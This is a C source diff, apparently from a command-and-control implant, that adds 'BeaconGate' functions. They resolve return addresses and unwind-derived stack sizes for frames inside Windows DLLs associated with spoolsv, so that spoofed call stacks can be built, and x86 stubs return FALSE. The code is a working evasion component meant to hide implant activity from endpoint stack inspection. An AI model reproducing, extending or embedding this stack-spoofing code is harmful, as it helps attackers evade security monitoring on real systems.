@@ -471,6 +471,47 @@ static BOOL g3_frame_size(unsigned __int64 addr, DWORD * out)
 	return g3_walk(rf, base, out, TRUE);
 }
 
+/* C-58 BeaconGate: resolve the spoolsv frame table (retaddrs + unwind
+ * exact stack sizes) without laying any page - the gate builds its own
+ * synthetic call frame and lays this chain above it. x86: FALSE. */
+BOOL g3_gate_frames(unsigned long long retaddr_out[4], unsigned long sizes_out[4])
+{
+	HMODULE mod;
+	int i;
+
+	g_lookup = (G3_LOOKUP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlLookupFunctionEntry");
+	if (g_lookup == NULL)
+		return FALSE;
+
+	for (i = 0; i < 4; i++) {
+		FARPROC fn;
+		mod = GetModuleHandleA(g_frames[i].dll);
+		if (mod == NULL) {
+			mod = LoadLibraryA(g_frames[i].dll);
+			if (mod == NULL)
+				return FALSE;
+		}
+		fn = GetProcAddress(mod, g_frames[i].func);
+		if (fn == NULL)
+			return FALSE;
+		retaddr_out[i] = (unsigned long long)fn + g_frames[i].offset;
+		if (!g3_frame_size(retaddr_out[i], &g_frames[i].stack_size))
+			return FALSE;
+		sizes_out[i] = g_frames[i].stack_size;
+	}
+	return TRUE;
+}
+
+/* C-58 BeaconGate: unwind frame size for an address inside any function
+ * (used to size the gadget frame). x86: FALSE. */
+BOOL g3_gate_frame_size_at(unsigned long long addr, DWORD * out)
+{
+	g_lookup = (G3_LOOKUP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlLookupFunctionEntry");
+	if (g_lookup == NULL)
+		return FALSE;
+	return g3_frame_size(addr, out);
+}
+
 static BOOL g3_init(void)
 {
 	HMODULE mod;
@@ -941,6 +982,18 @@ BOOL gen3_wait_pipe(HANDLE pipe)
 BOOL gen3_sleep(DWORD time)
 {
 	(void)time;
+	return FALSE;
+}
+
+BOOL g3_gate_frames(unsigned long long retaddr_out[4], unsigned long sizes_out[4])
+{
+	(void)retaddr_out; (void)sizes_out;
+	return FALSE;
+}
+
+BOOL g3_gate_frame_size_at(unsigned long long addr, DWORD * out)
+{
+	(void)addr; (void)out;
 	return FALSE;
 }
 
